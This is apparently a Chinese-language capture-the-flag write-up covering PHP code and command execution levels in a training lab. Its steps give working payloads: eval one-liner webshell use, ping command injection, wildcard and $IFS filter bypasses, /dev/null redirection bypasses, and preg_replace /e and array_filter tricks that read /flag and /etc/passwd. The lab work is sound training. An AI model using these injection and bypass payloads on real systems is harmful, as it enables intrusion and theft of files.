# level-0
代码执行&命令执行

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793490385148-293c78de-2a3c-4d3d-82bc-96811a60876c.png)

页面上直接给出了flag的值

# level-1
一句话木马和代码执行



![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793490518208-28d8070e-1146-48c0-bb04-1f86309bfd86.png)

eval()

eval() 是 Python 中的一个内置函数，它的主要作用是将字符串作为 Python 代码来执行。

分析一下源码

```php
<?php
  include "get_flag.php";      // 引入 flag 文件，里面定义全局变量 $flag
eval($_POST['a']);           //  把 POST 的 a 当 PHP 代码执行
?>
```

## 解题思路：
根据题目提示，这里面含有一个"get_flag.php"文件,以post a为切入口，用bp抓包查看含有flag的文件

## 解题步骤
![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793491006561-ab1440b0-e056-4e4c-889b-8e4162b61431.png)

抓包发到repeater，请求改为post，在host下面加一行

```php
Content-Type: application/x-www-form-urlencoded 
```

声明是表单数据

```php
a=system("cat get_falg.php")
```

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793491064894-a4728ff1-7fff-4fa1-a1b3-fcd7bda4e92a.png)

```php

<?php
$file_path = "/flag";
if (file_exists($file_path)) {
    $flag = file_get_contents($file_path);
}
else{
    $flag = "HelloCTF{Default_Flag}";
}
//根目录下有flag但不建议心存侥幸
```

题目应该是想让我们用echo读出全局变量里的flag

```php
a=echo $flag;
或
a=echo($flag);
```

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793492317283-4bcb18ea-419b-4a68-9afa-ff3c3670959d.png)

得到flag

## 总结
一开始我用cat /flag也直接读出flag了，算是出题人说的侥幸解法

利用system直接读取/flag文件

```php
a=system("cat /flag");
```

区分：这种方式读的是根目录下的文件，里面就是flag明文，而程序中的$flag是变量，利用echo查看，读取的是变量

# level-3
命令执行

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793492744176-ca43100a-8e46-47e0-aacf-b00104cbd1a5.png)

## 解题思路
尝试该漏洞入口点是否能执行系统命令，可以的话利用命令执行找出flag

## 解题步骤
根据题目中的提示，尝试了一下，发现可以运行

```php
a=cat /etc/passwd;
```

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793492983138-d2003bd6-2bc5-4ce8-a00f-4f3b35d42aeb.png)

说明可以直接进行命令执行

```php
a=ls /
```

发现有个flag文件夹

```php
a=cat /flag
```

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793493320983-faa5f6ff-6baf-4739-ae05-c65b6233e011.png)

查看得到flag

# level-4
命令执行-shell运算符

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793493360670-f8b54e45-04ca-4f88-9e82-96cfde53a949.png)

## 解题思路
```php
function hello_server($ip){
    system("ping -c 1 $ip");   // 输入被拼进 ping 命令
}
isset($_GET['ip']) ? hello_server($_GET['ip']) : null;
```

用shell运算符追加命令，入口GET ？ip=

## 解题步骤
根据代码提示，尝试

```php
？ip=8.8.8.8
```

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793493642914-a1fdbf24-2fea-430b-86fd-6085b6f9af6f.png)

有回显，ping命令可以执行

利用运算符构造payload

```php
？ip=8.8.8.8|cat+/flag
```

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793493706947-b235c347-9125-493a-a9a2-e661a7b625be.png)

得到flag

# level-5


![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793493969783-3dee29e8-0864-4e7c-938e-febbb1e9f4a6.png)

## 解题思路
从代码中可以看到如果直接输入/flag那就会遭到waf的拦截，要进行绕过

## 解题步骤
根据提示构造payload

```php

?cmd=/???/?at /fl？g
```

得到flag

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793494136902-84501ccd-c9bd-4d5c-8490-fb99ee10acdc.png)



# level-6
![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793494303147-7e4c451a-f1e6-486c-9086-992db5e18f96.png)

## 解题思路
可以看到，触发引号中的这些字符会被waf截断，那么这道题只剩下a 0-9 ？,可以用，以此构造payload

## 解题步骤
```php
?cmd=/???/?a? /??a?
```

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793494559404-24289f8e-9ce6-4235-8366-a82633160a2f.png)

翻到乱码底下可以看到flag

# level-7
![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793494615364-690f2c22-c717-4f5c-bf4b-2bf12129f672.png)

这道题拦截的是/flag和空格

所以，把空格用%09和$IFS替换，构造payload

```php
?cmd=cat$IFS/f*
或
?cmd=cat%09/f*
```

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793494786996-9a700844-3474-43db-a522-a411dac49db7.png)

# level-8
![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793494913403-1a4bc943-3a1b-444b-9461-c3924e6116c4.png)

从题目可以看到输入的cmd命令会被重定向到/dev/null文件，会把回显内容和错误都屏蔽掉

## 解题思路
1.可以构造payload，来让执行的命令输出结果重定向到某个文件中，然后再打开文件查看

2.可以利用注释把>/dev/null 2>&1 注释掉

3.也可以在重定向前做截断，让flag回显出来

## 解题步骤
```php
第一步：
/?cmd=cat /flag >1.txt;
第二步：（直接访问创建的文件）
/1.txt

```

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793495291120-77120cda-9541-442a-9cc9-7e8e8b057b13.png)

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793495301556-9b0cc54e-5a9f-4b2d-9c2c-728cc8b2710b.png)

```php
?cmd=1||cat+/flag+%23
```

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793495315627-463025aa-a5ef-4efc-b652-ec628e1267bd.png)

```php
?cmd=cat /flag;
```

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793495324848-a15d726c-7d0f-4d27-a99b-53da3733a8c8.png)

# level-2
![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793495663239-7e955c31-ed07-4f3e-9234-0ca52f321caf.png)

## 解题思路
先分析下题目中的源码

```php
session_start(); 

function hello_ctf($function, $content){
    global $flag;
    $code = $function . "(" . $content . ");";
    echo "Your Code: $code <br>";
    eval($code);
}
```

从这一段可以读到，我们控制的$content，会被原样拼进字符串，被eval（）当PHP代码执行，在后面可以读到$content就是我们POST进去的东西

```php
function get_fun(){
    $func_list = ['eval','assert','call_user_func',...];   // 10 个危险函数池
    if (!isset($_SESSION['random_func'])) {                // 没选过才随机
        $_SESSION['random_func'] = $func_list[array_rand($func_list)];
    }
    $random_func = $_SESSION['random_func'];               // 从 session 取
    echo "获得新的函数: $random_func ...";                // 打印选了谁
    return $_SESSION['random_func'];
}
```

这道题会从十个危险函数中随一个，存进session

session丢了或者用？action=r重置，会重新随机

```php
function start($act){
    $random_func = get_fun();                              // 先拿随机函数
    if($act == "r"){                                       // ?action=r → 重置
        session_unset(); session_destroy();                //   清掉 session，下次重新随机
    }
    if ($act == "submit"){                                 // ?action=submit → 触发
        $user_content = $_POST['content'];                 //   取 POST 的 content
        hello_ctf($random_func, $user_content);            //   拼 + eval 执行
    }
}
```

控制"重置"（r）和"执行"（submit）两个动作当GET参数action=submit时：获取POST参数content的值，调用hello_ctf()函数，使用随机选择的函数名和用户提交的内容

```php
isset($_GET['action']) ? start($_GET['action']) : '';   // 入口: 必须带 GET action
highlight_file(__FILE__);                                // 打印源码，方便查看
```



## 解题步骤
先用？action=submit看一下随到了什么函数



![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793496752154-c4e900c0-2248-4b3a-9a5a-d09e77e2cf9d.png)

这里我的是preg_replace

```php
preg_replace($pattern, $replacement, $subject)
```

普通用法：把 subject 里匹配 pattern 的部分，替换成 replacement

加 /e 修饰符后：replacement 不再是普通替换串，而是被当成 PHP 代码执行，执行结果作为替换内容（PHP5.5，在7.3版本后已经被取消）

```php
content = '/(.*)/e', 'print_r($flag)', 'x'
```

这里利用PHP调用函数先对实参求值的副作用，在函数真正调用之前，与函数无关

```php
content = print_r($flag)
```

如图，得到flag后才报错（删掉cookie又会随机一个新的参数）

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793499898047-ca7e1aea-ece0-43d8-a159-f8e54b823bb5.png)

重置一个新的函数![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793498953491-9903013b-f794-45d8-93bf-f198e5416c70.png)

记得要放行

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793498957519-66352b54-4f4f-450d-aed3-6a4f324b1c85.png)

新的函数array_filte

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793498998063-c2208295-842f-4dcc-bb3b-31b8575a3f78.png)

```php
content=['cat /flag'],'system'
```

拼进eval里相当于

```php
eval("array_filter(['cat /flag'],'system');");
```

遍历数组 ['cat /flag'] 时把元素 'cat /flag' 取出来当参数调 system，system('cat /flag') 执行命令就出 flag

![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793499296850-b8dfcbe0-e8a1-4e34-9101-8d9e01f28f2f.png)

## 总结
![](https://cdn.nlark.com/yuque/0/2026/png/73090803/1793500209705-66b418b1-703f-4ef1-8452-da1d116b4635.png)

【PHP 代码执行相关函数 -  CSDN App】[https://blog.csdn.net/weixin_73049307/article/details/143307178?sharetype=blogdetail&shareId=143307178&sharerefer=APP&sharesource=Zorv1&sharefrom=link](https://blog.csdn.net/weixin_73049307/article/details/143307178?sharetype=blogdetail&shareId=143307178&sharerefer=APP&sharesource=Zorv1&sharefrom=link)



